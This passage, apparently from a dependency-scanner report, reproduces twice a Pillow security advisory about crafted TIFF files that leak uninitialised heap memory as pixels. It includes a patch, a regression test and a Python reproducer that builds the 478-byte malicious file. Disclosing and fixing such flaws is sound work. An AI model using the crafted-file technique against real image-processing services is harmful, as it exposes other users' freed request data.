is known) is needed\n\u003e because the same buffer is reused for every strip, and a short last strip would otherwise\n\u003e expose the previous strip's rows — harmless for disclosure, but the per-read `memset`\n\u003e keeps the behaviour uniform at the cost of one extra pass over the buffer. Promoting\n\u003e libtiff warnings to errors via a warning handler is not a good alternative: both codecs\n\u003e only warn (`Improper JPEG strip/tile size`, `Premature EOL`), but so do many legitimate\n\u003e files (unknown tags, bad tag counts), and the return value of `TIFFReadEncodedStrip()`\n\u003e carries no row count to check against. Initialising the buffer covers every codec.\n\u003e `_decodeAsRGBA()` needs no change: `TIFFRGBAImageGet()` fills its whole raster, and JPEG\n\u003e files do not reach it (`JPEGCOLORMODE_RGB` sends them down the strip path).\n\u003e \n\u003e Valid files decode exactly as before; rows a codec does not produce are now black instead\n\u003e of garbage, and nothing that previously loaded now fails. The patch also adds\n\u003e `test_jpeg_short_strip` to `Tests/test_file_libtiff.py`, parametrised over strip and tile,\n\u003e which builds the 256×8-JPEG-in-256×256 file and asserts rows 8–255 are zero. It is a\n\u003e regression guard for the fixed code rather than a reliable detector of the bug: in a fresh\n\u003e pytest process the unfixed strip variant can pass because the new heap chunk happens to be\n\u003e zero (the tiled variant fails before the fix). With the patch, `Tests/test_file_libtiff.py`\n\u003e and `Tests/test_file_tiff.py` pass and the reproducer prints `OK`.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Zero the libtiff strip/tile buffer before each TIFFReadEncodedStrip/TIFFReadTile in TiffDecode.c so short strips do not expose uninitialised heap\n\u003e \n\u003e Applies to `src/libImaging/TiffDecode.c` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\n\u003e index 3d804ea4a..67bc96329 100644\n\u003e --- a/Tests/test_file_libtiff.py\n\u003e +++ b/Tests/test_file_libtiff.py\n\u003e @@ -1162,6 +1162,45 @@ class TestFileLibTiff(LibTiffTestCase):\n\u003e              im.load()\n\u003e          assert im.size == (950, 975)\n\u003e  \n\u003e +    @pytest.mark.parametrize(\"tiled\", (False, True))\n\u003e +    def test_jpeg_short_strip(self, tiled: bool) -\u003e None:\n\u003e +        # The JPEG data in the strip/tile only contains 8 of the 256 rows that\n\u003e +        # RowsPerStrip/TileLength declare. libtiff decodes the rows that exist\n\u003e +        # and still reports success, so the remaining rows must be cleared\n\u003e +        # rather than left as uninitialised memory.\n\u003e +        jpeg = io.BytesIO()\n\u003e +        Image.new(\"L\", (256, 8), 200).save(jpeg, \"JPEG\")\n\u003e +        jpeg_data = jpeg.getvalue()\n\u003e +\n\u003e +        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n\u003e +        ifd[256] = 256  # ImageWidth\n\u003e +        ifd[257] = 256  # ImageLength\n\u003e +        ifd[258] = 8  # BitsPerSample\n\u003e +        ifd[259] = 7  # Compression: JPEG\n\u003e +        ifd[262] = 1  # PhotometricInterpretation: BlackIsZero\n\u003e +        ifd[277] = 1  # SamplesPerPixel\n\u003e +        if tiled:\n\u003e +            ifd[322] = 256  # TileWidth\n\u003e +            ifd[323] = 256  # TileLength\n\u003e +            ifd[324] = 0  # TileOffsets\n\u003e +            ifd[325] = len(jpeg_data)  # TileByteCounts\n\u003e +            # Point the tile data at the end of the IFD\n\u003e +            ifd[324] = 8 + len(ifd.tobytes(8))\n\u003e +        else:\n\u003e +            ifd[278] = 256  # RowsPerStrip\n\u003e +            ifd[STRIPOFFSETS] = 0  # Updated by tobytes() to follow the IFD\n\u003e +            ifd[279] = len(jpeg_data)  # StripByteCounts\n\u003e +\n\u003e +        b = io.BytesIO()\n\u003e +        ifd.save(b)\n\u003e +        b.write(jpeg_data)\n\u003e +\n\u003e +        with Image.open(b) as im:\n\u003e +            assert im.tile[0][0] == \"libtiff\"\n\u003e +            im.load()\n\u003e +            assert im.crop((0, 0, 256, 8)).getextrema() == (200, 200)\n\u003e +            assert im.crop((0, 8, 256, 256)).getextrema() == (0, 0)\n\u003e +\n\u003e      def test_orientation(self) -\u003e None:\n\u003e          with Image.open(\"Tests/images/g4_orientation_1.tif\") as base_im:\n\u003e              for i in range(2, 9):\n\u003e diff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\n\u003e index 8a57c523d..d1d6bfbbb 100644\n\u003e --- a/src/libImaging/TiffDecode.c\n\u003e +++ b/src/libImaging/TiffDecode.c\n\u003e @@ -457,6 +457,11 @@ _decodeTile(\n\u003e          for (plane = 0; plane \u003c planes; plane++) {\n\u003e              ImagingShuffler shuffler = unpackers[plane];\n\u003e              for (x = state-\u003exoff; x \u003c state-\u003exsize; x += tile_width) {\n\u003e +                // Some codecs (e.g. JPEG, Group 4) succeed on a tile that decodes\n\u003e +                // to fewer rows than the tile length, leaving the rest of the\n\u003e +                // buffer untouched. Clear it so that uninitialised memory is not\n\u003e +                // copied into the image.\n\u003e +                memset(state-\u003ebuffer, 0, state-\u003ebytes);\n\u003e                  if (TIFFReadTile(tiff, (tdata_t)state-\u003ebuffer, x, y, 0, plane) == -1) {\n\u003e                      TRACE((\"Decode Error, Tile at %dx%d\\n\", x, y));\n\u003e                      state-\u003eerrcode = IMAGING_CODEC_BROKEN;\n\u003e @@ -563,6 +568,11 @@ _decodeStrip(\n\u003e          int plane;\n\u003e          for (plane = 0; plane \u003c planes; plane++) {\n\u003e              ImagingShuffler shuffler = unpackers[plane];\n\u003e +            // Some codecs (e.g. JPEG, Group 4) succeed on a strip that decodes\n\u003e +            // to fewer rows than RowsPerStrip, leaving the rest of the buffer\n\u003e +            // untouched. Clear it so that uninitialised memory is not copied\n\u003e +            // into the image.\n\u003e +            memset(state-\u003ebuffer, 0, state-\u003ebytes);\n\u003e              if (TIFFReadEncodedStrip(\n\u003e                      tiff,\n\u003e                      TIFFComputeStrip(tiff, state-\u003ey, plane),\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,688 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # Pillow TiffDecode.c _decodeStrip/_decodeTile: strip/tile buffer is realloc()ed, never\n\u003e # initialised, and copied whole into the image even when libtiff's JPEG codec decoded\n\u003e # fewer rows than RowsPerStrip/TileLength.  Two independent signals:\n\u003e #  pass 1 (normal heap): seed freed 64 KiB chunks with b\"LEAK\" just before load() and\n\u003e #         count copies of LEAK in the decoded pixels (file contains no such bytes);\n\u003e #  pass 2 (same script re-run under glibc MALLOC_PERTURB_=170): fresh malloc memory is\n\u003e #         0x55, so rows that come back all-0x55 are provably uninitialised heap.\n\u003e import gc, io, os, struct, subprocess, sys\n\u003e from PIL import Image\n\u003e W = H = 256; ROWS = 8\n\u003e perturbed = os.environ.get(\"MALLOC_PERTURB_\") == \"170\"\n\u003e if not perturbed:\n\u003e     print(\"Pillow\", Image.__version__, Image.core.__file__)\n\u003e \n\u003e def tiff(jpeg_rows, tiled):\n\u003e     j = io.BytesIO(); Image.new(\"L\", (W, jpeg_rows), 200).save(j, \"JPEG\"); j = j.getvalue()\n\u003e     tags = [(256,3,1,W), (257,3,1,H), (258,3,1,8), (259,3,1,7), (262,3,1,1), (277,3,1,1)]\n\u003e     tags += ([(322,3,1,W), (323,3,1,H), (324,4,1,0), (325,4,1,len(j))] if tiled else\n\u003e              [(273,4,1,0), (278,3,1,H), (279,4,1,len(j))])\n\u003e     tags.sort(); off = 8 + 2 + 12*len(tags) + 4\n\u003e     tags = [(t,ty,c, off if t in (273,324) else v) for t,ty,c,v in tags]\n\u003e     ifd = struct.pack(\"\u003cH\", len(tags)) + b\"\".join(struct.pack(\"\u003cHHLL\", *t) for t in tags)\n\u003e     return b\"II*\\0\" + struct.pack(\"\u003cL\", 8) + ifd + struct.pack(\"\u003cL\", 0) + j\n\u003e \n\u003e bug = False\n\u003e for tiled in (False, True):\n\u003e     for jpeg_rows, label in ((H, \"well-formed\"), (ROWS, \"crafted\")):\n\u003e         data = tiff(jpeg_rows, tiled); assert b\"LEAK\" not in data\n\u003e         im = Image.open(io.BytesIO(data)); assert im.tile[0][0] == \"libtiff\"\n\u003e         junk = [bytearray(b\"LEAK\" * (W*H//4)) for _ in range(6)]; del junk; gc.collect()\n\u003e         im.load()                                   # no exception for either file\n\u003e         below = im.tobytes()[W*ROWS:]\n\u003e         n55, nleak = below.count(0x55), below.count(b\"LEAK\")\n\u003e         print(f\"[{'perturb' if perturbed else 'normal '}] {'tiled' if tiled else 'strip'} \"\n\u003e               f\"{label:11s} ({len(data):4d} B) rows {ROWS}-{H-1}: {nleak:5d} x b'LEAK', \"\n\u003e               f\"{n55:5d}/{len(below)} == 0x55, head={below[:8]!r}\")\n\u003e         if jpeg_rows == ROWS and (nleak \u003e 0 or (perturbed and n55 == len(below))):\n\u003e             bug = True\n\u003e if not perturbed:\n\u003e     r = subprocess.run([sys.executable, sys.argv[0]], env={**os.environ, \"MALLOC_PERTURB_\": \"170\"},\n\u003e                        capture_output=True, text=True)\n\u003e     lines = r.stdout.rstrip().split(\"\\n\")\n\u003e     print(\"\\n\".join(lines[:-1])); sys.stderr.write(r.stderr)\n\u003e     bug = bug or lines[-1] == \"BUG\"\n\u003e print(\"BUG\" if bug else \"OK\")\n\u003e ```\n\u003e \u003c/details\u003e\n\u003e \n\u003e ---\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-q45j-58j2-45rg | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112897\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112897](https://osv.dev/CVE-2026-112897)**.\n\n## [GHSA-q45j-58j2-45rg](https://osv.dev/GHSA-q45j-58j2-45rg)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e TiffDecode returns uninitialized memory as pixels for short JPEG strips\n\u003e Location: src/libImaging/TiffDecode.c:554  in _decodeStrip()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e Pillow hands back leftover process memory as image pixels when it opens a small crafted TIFF file. Anyone who can get an application to open their image, and can see something produced from its pixels (a thumbnail, a preview, a converted copy), can read heap memory that the process had previously used and freed. This works in the default configuration: opening and loading the 478-byte file succeeds with no error or warning, and every row below the first eight holds stale memory instead of picture content.\n\u003e \n\u003e The bug is in `_decodeStrip()` in `src/libImaging/TiffDecode.c`, and `_decodeTile()` has the same shape. The function `realloc()`s `state-\u003ebuffer` to `TIFFStripSize()` bytes without initialising it and calls `TIFFReadEncodedStrip()`. Whenever that call does not return -1, it copies all `RowsPerStrip` rows of the buffer into the image. libtiff's JPEG codec only warns when the JPEG embedded in a strip has fewer rows than the strip, and Pillow silences libtiff warnings. The codec decodes the rows that exist and still returns the full strip size, so the untouched remainder is copied out as pixels. libtiff's Group 4 fax codec behaves the same way for a stream that ends early.\n\u003e \n\u003e The attached reproducer builds a 256×256 TIFF whose single strip or tile is a 256×8 JPEG. Before loading it, the script frees buffers filled with `b\"LEAK\"`. It then finds 15,872 copies of `LEAK` in rows 8–255 of the decoded image (the same freed chunk was reused in 500 of 500 runs). Under glibc's `MALLOC_PERTURB_`, those rows are entirely the allocator's fill byte. A well-formed control file decodes correctly in both cases.\n\u003e \n\u003e This is a read of uninitialised heap memory, not memory corruption. Each strip can disclose up to width × `RowsPerStrip` bytes, and what comes back depends on the allocator's state at the time. The strip path was introduced in e91b851fdc1c (\"Add reading old-JPEG compressed TIFFs\", first released in Pillow 6.0.0). The tile path has had the same pattern since f0436a4ddc95 (Pillow 5.3.0).\n\u003e \n\u003e ## Details\n\u003e \n\u003e `src/libImaging/TiffDecode.c` decodes compressed TIFFs through libtiff into a strip\n\u003e (or tile) buffer that it `realloc()`s to `TIFFStripSize()` bytes and never initialises, and\n\u003e then copies all `RowsPerStrip` rows of that buffer into the image whenever\n\u003e `TIFFReadEncodedStrip()` does not return -1. libtiff's JPEG codec does not fail when the\n\u003e JPEG stream inside a strip has fewer rows than the strip: it decodes the rows that exist\n\u003e and returns the full strip size. The rows it did not write are whatever the heap held\n\u003e before, and Pillow returns them as pixels.\n\u003e \n\u003e A 478-byte file shows it: a classic little-endian TIFF, 256×256, `BitsPerSample=8`,\n\u003e `Compression=7`, `PhotometricInterpretation=1`, `RowsPerStrip=256`, one strip whose data\n\u003e is a baseline JPEG of 256×**8** pixels (as written by `Image.new(\"L\",(256,8),200).save(…,\"JPEG\")`).\n\u003e `Image.open(BytesIO(data)).load()` succeeds with default settings (compressed TIFFs always\n\u003e take the libtiff path). Rows 0–7 of the result are the JPEG content (value 200); the\n\u003e remaining 63488 bytes of `im.tobytes()` are heap garbage: run under glibc's\n\u003e `MALLOC_PERTURB_=1` they are all `0xFE`, under `MALLOC_PERTURB_=170` all `0x55` (the\n\u003e fresh-`malloc` fill byte), and in a process that has just freed buffers containing\n\u003e `b\"LEAK\"` they contain 15872 copies of `LEAK`.\n\u003e \n\u003e Feeding the same file to libtiff 4.5.0 directly confirms the library side:\n\u003e `TIFFReadEncodedStrip(t, 0, buf, 65536)` prints\n\u003e `JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`,\n\u003e returns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs\n\u003e `TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either.\n\u003e \n\u003e The strip path:\n\u003e \n\u003e ```c\n\u003e // src/libImaging/TiffDecode.c:552\n\u003e     /* realloc to fit whole strip */\n\u003e     /* malloc check above */\n\u003e     new_data = realloc(state-\u003ebuffer, state-\u003ebytes);      // state-\u003ebytes = TIFFStripSize()\n\u003e     …\n\u003e     state-\u003ebuffer = new_data;\n\u003e \n\u003e     for (; state-\u003ey \u003c state-\u003eysize; state-\u003ey += rows_per_strip) {\n\u003e         …\n\u003e             if (TIFFReadEncodedStrip(\n\u003e                     tiff,\n\u003e                     TIFFComputeStrip(tiff, state-\u003ey, plane),\n\u003e                     (tdata_t)state-\u003ebuffer,\n\u003e                     strip_size\n\u003e                 ) == -1) {\n\u003e                 … return -1;\n\u003e             }\n\u003e             …\n\u003e             // iterate over each row in the strip and stuff data into image\n\u003e             for (strip_row = 0;\n\u003e                  strip_row \u003c MIN((INT32)rows_per_strip, state-\u003eysize - state-\u003ey);\n\u003e                  strip_row++) {\n\u003e                 …\n\u003e                 shuffler(\n\u003e                     (UINT8 *)im-\u003eimage[state-\u003ey + state-\u003eyoff + strip_row] +\n\u003e                         state-\u003exoff * im-\u003epixelsize,\n\u003e                     state-\u003ebuffer + strip_row * row_byte_size,\n\u003e                     state-\u003exsize\n\u003e                 );\n\u003e ```\n\u003e \n\u003e `state-\u003ebuffer` arrives here as the one-row `calloc` made by `decode.c:230`\n\u003e (`(bits*xsize+7)/8` = 256 bytes for the example). The `realloc` to 65536 bytes hands back\n\u003e a different, uninitialised chunk; nothing zeroes it. `TIFFReadEncodedStrip()` returns the\n\u003e nominal strip size on success, not the number of rows produced, and the only check is\n\u003e `== -1`, so the row loop unconditionally copies 256 rows × 256 bytes into `im-\u003eimage`\n\u003e (which itself is zeroed by `core.new`, so the garbage provably comes from `state-\u003ebuffer`).\n\u003e `_decodeTile()` has the same shape (`TiffDecode.c:448` `realloc` to `TIFFTileSize()`, then\n\u003e `tile_length` rows copied after each `TIFFReadTile()` at 460–488).\n\u003e \n\u003e For a well-formed file the JPEG inside the strip is 256×256, libtiff fills all 65536 bytes\n\u003e and the copy is correct. The malicious file differs only in the SOF height of the embedded\n\u003e JPEG; libtiff treats \"JPEG smaller than strip\" as a warning, clamps the row count to the\n\u003e JPEG height, and reports success.\n\u003e \n\u003e JPEG is not the only libtiff codec that succeeds on a short strip. `Fax4Decode`\n\u003e (`Compression=4`) returns success for a T.6 stream that ends early: a 133-byte 512×256\n\u003e 1-bit TIFF whose strip is the Group 4 stream of a 512×16 image loads without error,\n\u003e libtiff writes 17 rows (1088 bytes) of the 16384-byte buffer\n\u003e (`Fax4Decode: Warning, Premature EOL at line 16`, return value 16384) and the other\n\u003e 15296 bytes are again heap contents. LZW, Deflate, PackBits, Group 3 and CCITT RLE were\n\u003e checked and do return -1 on short data, so Pillow raises `OSError` for those.\n\u003e \n\u003e The strip path was introduced in `e91b851fdc1c` (\"Add reading old-JPEG compressed TIFFs\",\n\u003e 2018-12-08), first released in Pillow 6.0.0, which replaced row-by-row `TIFFReadScanline()`\n\u003e (where libtiff errors on the first missing row) with the whole-strip `realloc()` and copy.\n\u003e The tile path has had the same shape since it was added in `f0436a4ddc95` (2018-07-02,\n\u003e Pillow 5.3.0).\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Any application that opens attacker-supplied images with Pillow in the default\n\u003e configuration and returns something derived from the pixels (thumbnail, preview, format\n\u003e conversion, OCR text) discloses freed heap memory of the worker process to the uploader:\n\u003e everything below the rows the embedded JPEG/G4 stream actually encodes, up to\n\u003e `ImageWidth × RowsPerStrip × SamplesPerPixel` bytes per strip and tens of MB per image\n\u003e within the default `MAX_IMAGE_PIXELS`. `load()` raises nothing, so the application has no\n\u003e signal that the image is malformed. What comes back depends on allocator state; in a\n\u003e long-running web worker it is typically recently freed request bodies, other users'\n\u003e decoded image buffers and Python object contents. There is no memory corruption; this is\n\u003e a read of uninitialised (previously used) heap memory, analogous in effect to an\n\u003e out-of-bounds read that lands in pixels.\n\u003e \n\u003e ## Reproducing\n\u003e \n\u003e `repro` is a short Python script that runs against the installed Pillow build with\n\u003e default settings: no rebuild, no sanitizer, no files written. It runs twice, once normally\n\u003e and once re-executing itself under glibc's `MALLOC_PERTURB_=170`, and the last line it\n\u003e prints is `BUG` or `OK`.\n\u003e \n\u003e **Input.** `tiff(jpeg_rows, tiled)` builds a little-endian TIFF in memory. The header\n\u003e declares a 256×256 8-bit greyscale image with `Compression=7` (JPEG), either as one strip\n\u003e (`RowsPerStrip=256`) or as one 256×256 tile (`TileWidth`/`TileLength`). The strip or tile\n\u003e is a baseline JPEG of 256×`jpeg_rows` pixels, all value 200, written by Pillow's own JPEG\n\u003e encoder. For each layout the script builds two files:\n\u003e \n\u003e - **Control:** `jpeg_rows=256`. This is a well-formed file, and libtiff fills the whole\n\u003e   64 KiB strip/tile.\n\u003e - **Crafted:** `jpeg_rows=8`, 478 bytes (strip) or 490 bytes (tile). The only difference\n\u003e   is the embedded JPEG's height. libtiff decodes 8 rows (2048 bytes), warns\n\u003e   `Improper JPEG strip/tile size` (Pillow silences the warning) and returns the full\n\u003e   strip/tile size as success.\n\u003e \n\u003e **Steps.** Each file is opened (the script asserts it takes the `libtiff` decoder). Just\n\u003e before `im.load()` the script allocates and frees six 64 KiB `bytearray`s filled with\n\u003e `b\"LEAK\"`, which leaves freed heap chunks about the size of the buffer that\n\u003e `_decodeStrip()`/`_decodeTile()` is about to `realloc()`. For rows 8–255 it then counts\n\u003e copies of `LEAK` and bytes equal to `0x55` (glibc's fresh-`malloc` fill under\n\u003e `MALLOC_PERTURB_=170`). The files contain no `LEAK` bytes (the script asserts this), so\n\u003e any copy in the image came from freed heap memory. It reports `BUG` if a crafted file\n\u003e shows any `LEAK` in the normal pass, or rows 8–255 entirely `0x55` in the perturbed pass.\n\u003e \n\u003e **Expected output on this tree:**\n\u003e \n\u003e ```\n\u003e [normal ] strip well-formed (1222 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n\u003e [normal ] strip crafted     ( 478 B) rows 8-255: 15872 x b'LEAK',     0/63488 == 0x55, head=b'LEAKLEAK'\n\u003e [normal ] tiled well-formed (1234 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n\u003e [normal ] tiled crafted     ( 490 B) rows 8-255: 15872 x b'LEAK',     0/63488 == 0x55, head=b'LEAKLEAK'\n\u003e [perturb] strip well-formed (1222 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n\u003e [perturb] strip crafted     ( 478 B) rows 8-255:     0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU'\n\u003e [perturb] tiled well-formed (1234 B) rows 8-255:     0 x b'LEAK',     0/63488 == 0x55, head=b'\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8\\xc8'\n\u003e [perturb] tiled crafted     ( 490 B) rows 8-255:     0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU'\n\u003e BUG\n\u003e ```\n\u003e \n\u003e `im.load()` succeeds for every file. For the crafted files rows 8–255 are the uninitialised\n\u003e strip/tile buffer, copied as-is into the image. With the attached patch applied, rows 8–255\n\u003e of the crafted files come back as `\\x00` bytes, with no `LEAK` and no `0x55`, and the\n\u003e script ends with `OK`.\n\u003e \n\u003e The `LEAK` count depends on where glibc places the buffer (the same freed chunk was reused\n\u003e in 500 of 500 runs here); the `MALLOC_PERTURB_` pass does not. The script covers the JPEG\n\u003e codec only. The Group 4 variant in the Details section (`Compression=4`, a T.6 stream that\n\u003e ends early) goes through the same `_decodeStrip()` copy, and the same fix covers it.\n\u003e \n\u003e ## Suggested fix\n\u003e \n\u003e The attached patch zeroes `state-\u003ebuffer` before each libtiff read in both loops of\n\u003e `src/libImaging/TiffDecode.c` — before `TIFFReadTile()` in `_decodeTile()` and before\n\u003e `TIFFReadEncodedStrip()` in `_decodeStrip()` — so rows a codec does not produce are\n\u003e deterministic zeros rather than stale heap:\n\u003e \n\u003e ```diff\n\u003e --- a/src/libImaging/TiffDecode.c\n\u003e +++ b/src/libImaging/TiffDecode.c\n\u003e @@ _decodeTile\n\u003e              for (x = state-\u003exoff; x \u003c state-\u003exsize; x += tile_width) {\n\u003e +                memset(state-\u003ebuffer, 0, state-\u003ebytes);\n\u003e                  if (TIFFReadTile(tiff, (tdata_t)state-\u003ebuffer, x, y, 0, plane) == -1) {\n\u003e @@ _decodeStrip\n\u003e          for (plane = 0; plane \u003c planes; plane++) {\n\u003e              ImagingShuffler shuffler = unpackers[plane];\n\u003e +            memset(state-\u003ebuffer, 0, state-\u003ebytes);\n\u003e              if (TIFFReadEncodedStrip(\n\u003e ```\n\u003e \n\u003e A `memset` per strip/tile (rather than one `calloc` after the size is known) is needed\n\u003e because the same buffer is reused for every strip, and a short last strip would otherwise\n\u003e expose the previous strip's rows — harmless for disclosure, but the per-read `memset`\n\u003e keeps the behaviour uniform at the cost of one extra pass over the buffer. Promoting\n\u003e libtiff warnings to errors via a warning handler is not a good alternative: both codecs\n\u003e only warn (`Improper JPEG strip/tile size`, `Premature EOL`), but so do many legitimate\n\u003e files (unknown tags, bad tag counts), and the return value of `TIFFReadEncodedStrip()`\n\u003e carries no row count to check against. Initialising the buffer covers every codec.\n\u003e `_decodeAsRGBA()` needs no change: `TIFFRGBAImageGet()` fills its whole raster, and JPEG\n\u003e files do not reach it (`JPEGCOLORMODE_RGB` sends them down the strip path).\n\u003e \n\u003e Valid files decode exactly as before; rows a codec does not produce are now black instead\n\u003e of garbage, and nothing that previously loaded now fails. The patch also adds\n\u003e `test_jpeg_short_strip` to `Tests/test_file_libtiff.py`, parametrised over strip and tile,\n\u003e which builds the 256×8-JPEG-in-256×256 file and asserts rows 8–255 are zero. It is a\n\u003e regression guard for the fixed code rather than a reliable detector of the bug: in a fresh\n\u003e pytest process the unfixed strip variant can pass because the new heap chunk happens to be\n\u003e zero (the tiled variant fails before the fix). With the patch, `Tests/test_file_libtiff.py`\n\u003e and `Tests/test_file_tiff.py` pass and the reproducer prints `OK`.\n\u003e \n\u003e ## The patch\n\u003e \n\u003e Zero the libtiff strip/tile buffer before each TIFFReadEncodedStrip/TIFFReadTile in TiffDecode.c so short strips do not expose uninitialised heap\n\u003e \n\u003e Applies to `src/libImaging/TiffDecode.c` at the commit above.\n\u003e \n\u003e ```diff\n\u003e diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\n\u003e index 3d804ea4a..67bc96329 100644\n\u003e --- a/Tests/test_file_libtiff.py\n\u003e +++ b/Tests/test_file_libtiff.py\n\u003e @@ -1162,6 +1162,45 @@ class TestFileLibTiff(LibTiffTestCase):\n\u003e              im.load()\n\u003e          assert im.size == (950, 975)\n\u003e  \n\u003e +    @pytest.mark.parametrize(\"tiled\", (False, True))\n\u003e +    def test_jpeg_short_strip(self, tiled: bool) -\u003e None:\n\u003e +        # The JPEG data in the strip/tile only contains 8 of the 256 rows that\n\u003e +        # RowsPerStrip/TileLength declare. libtiff decodes the rows that exist\n\u003e +        # and still reports success, so the remaining rows must be cleared\n\u003e +        # rather than left as uninitialised memory.\n\u003e +        jpeg = io.BytesIO()\n\u003e +        Image.new(\"L\", (256, 8), 200).save(jpeg, \"JPEG\")\n\u003e +        jpeg_data = jpeg.getvalue()\n\u003e +\n\u003e +        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n\u003e +        ifd[256] = 256  # ImageWidth\n\u003e +        ifd[257] = 256  # ImageLength\n\u003e +        ifd[258] = 8  # BitsPerSample\n\u003e +        ifd[259] = 7  # Compression: JPEG\n\u003e +        ifd[262] = 1  # PhotometricInterpretation: BlackIsZero\n\u003e +        ifd[277] = 1  # SamplesPerPixel\n\u003e +        if tiled:\n\u003e +            ifd[322] = 256  # TileWidth\n\u003e +            ifd[323] = 256  # TileLength\n\u003e +            ifd[324] = 0  # TileOffsets\n\u003e +            ifd[325] = len(jpeg_data)  # TileByteCounts\n\u003e +            # Point the tile data at the end of the IFD\n\u003e +            ifd[324] = 8 + len(ifd.tobytes(8))\n\u003e +        else:\n\u003e +            ifd[278] = 256  # RowsPerStrip\n\u003e +            ifd[STRIPOFFSETS] = 0  # Updated by tobytes() to follow the IFD\n\u003e +            ifd[279] = len(jpeg_data)  # StripByteCounts\n\u003e +\n\u003e +        b = io.BytesIO()\n\u003e +        ifd.save(b)\n\u003e +        b.write(jpeg_data)\n\u003e +\n\u003e +        with Image.open(b) as im:\n\u003e +            assert im.tile[0][0] == \"libtiff\"\n\u003e +            im.load()\n\u003e +            assert im.crop((0, 0, 256, 8)).getextrema() == (200, 200)\n\u003e +            assert im.crop((0, 8, 256, 256)).getextrema() == (0, 0)\n\u003e +\n\u003e      def test_orientation(self) -\u003e None:\n\u003e          with Image.open(\"Tests/images/g4_orientation_1.tif\") as base_im:\n\u003e              for i in range(2, 9):\n\u003e diff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\n\u003e index 8a57c523d..d1d6bfbbb 100644\n\u003e --- a/src/libImaging/TiffDecode.c\n\u003e +++ b/src/libImaging/TiffDecode.c\n\u003e @@ -457,6 +457,11 @@ _decodeTile(\n\u003e          for (plane = 0; plane \u003c planes; plane++) {\n\u003e              ImagingShuffler shuffler = unpackers[plane];\n\u003e              for (x = state-\u003exoff; x \u003c state-\u003exsize; x += tile_width) {\n\u003e +                // Some codecs (e.g. JPEG, Group 4) succeed on a tile that decodes\n\u003e +                // to fewer rows than the tile length, leaving the rest of the\n\u003e +                // buffer untouched. Clear it so that uninitialised memory is not\n\u003e +                // copied into the image.\n\u003e +                memset(state-\u003ebuffer, 0, state-\u003ebytes);\n\u003e                  if (TIFFReadTile(tiff, (tdata_t)state-\u003ebuffer, x, y, 0, plane) == -1) {\n\u003e                      TRACE((\"Decode Error, Tile at %dx%d\\n\", x, y));\n\u003e                      state-\u003eerrcode = IMAGING_CODEC_BROKEN;\n\u003e @@ -563,6 +568,11 @@ _decodeStrip(\n\u003e          int plane;\n\u003e          for (plane = 0; plane \u003c planes; plane++) {\n\u003e              ImagingShuffler shuffler = unpackers[plane];\n\u003e +            // Some codecs (e.g. JPEG, Group 4) succeed on a strip that decodes\n\u003e +            // to fewer rows than RowsPerStrip, leaving the rest of the buffer\n\u003e +            // untouched. Clear it so that uninitialised memory is not copied\n\u003e +            // into the image.\n\u003e +            memset(state-\u003ebuffer, 0, state-\u003ebytes);\n\u003e              if (TIFFReadEncodedStrip(\n\u003e                      tiff,\n\u003e                      TIFFComputeStrip(tiff, state-\u003ey, plane),\n\u003e ```\n\u003e \n\u003e ## The reproducer\n\u003e \n\u003e \u003cdetails\u003e\n\u003e \u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,688 bytes (click to open)\u003c/summary\u003e\n\u003e \n\u003e Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e # Pillow TiffDecode.c _decodeStrip/_decodeTile: strip/tile buffer is realloc()ed, never\n\u003e # initialised, and copied whole into the image even when libtiff's 